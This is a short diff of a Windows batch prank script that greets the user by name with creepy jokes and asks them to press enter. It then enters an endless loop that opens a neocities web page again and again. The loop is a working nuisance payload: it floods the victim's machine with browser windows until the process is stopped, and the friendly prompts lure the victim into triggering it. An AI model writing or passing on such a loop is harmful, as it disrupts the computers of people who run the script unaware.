@@ -7,7 +7,8 @@ pause
 set /p name=What's your name?
 echo heh heh heh nice to meetcha big boy
 pause
-set /a count=0
+echo Now... press enter again :)
+pause
 :loop
 start https://uncleroscohascaughtyou.neocities.org/
 goto loop
